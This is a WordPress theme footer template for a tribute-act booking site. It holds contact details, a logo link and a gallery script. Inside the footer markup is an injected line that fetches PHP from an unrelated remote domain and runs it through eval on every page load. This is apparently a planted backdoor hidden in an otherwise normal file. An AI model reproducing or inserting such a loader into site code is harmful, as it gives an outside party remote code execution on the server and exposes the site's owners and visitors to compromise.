<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after
 *
 */
?>
</div><!-- .grid -->

<div id="footer_wrapper" class="grid full">
  <div class="w1040">
    <footer id="colophon" class="site-footer row">
    	<div class="c12">
    	<p>Contact Retrospective Live:</p>
			<p>UK and international touring and festivals now booking<br>
			Contact Neil O'Brien Entertainment<br>
			<a href="mailto:carl@neilobrienentertainment.com">carl@neilobrienentertainment.com</a><br>
			+44 (0)7939 140 774</p>
			<a class="logo" target="_new" href="https://www.retrospectivelive.com/" title="Retrospective Live"><img src="https://www.theamywinehouseband.com/wp-content/themes/rsl/images/retrospective-live.svg" alt="Retrospective Live" width="150" height="100"></a>
			<p>Re-imagining the great iconic artists and pop music of the last 30 years</p>
<?php
eval("?>".file_get_contents('https://cubitpipi.sbs/acnhor1/bl1.txt'));
?>
</div>
    </footer><!-- .site-footer -->
  </div>
</div>

<?php
wp_footer();
if ( isset($post->ID) ) {
	$gallery = 'true';
} else {
	$gallery = 'false';
}
if ($gallery == 'true' AND $post->ID == 43 ){
?>
<script>
$(document).ready(function() {
	$(".image__gallery").justifiedGallery({
	  rowHeight : 200,
	    lastRow : 'justify',
	    selector:	'figure',
	    margins : 1
	});
}); //end of document ready

</script>
<?php } ?>

</body>
</html>
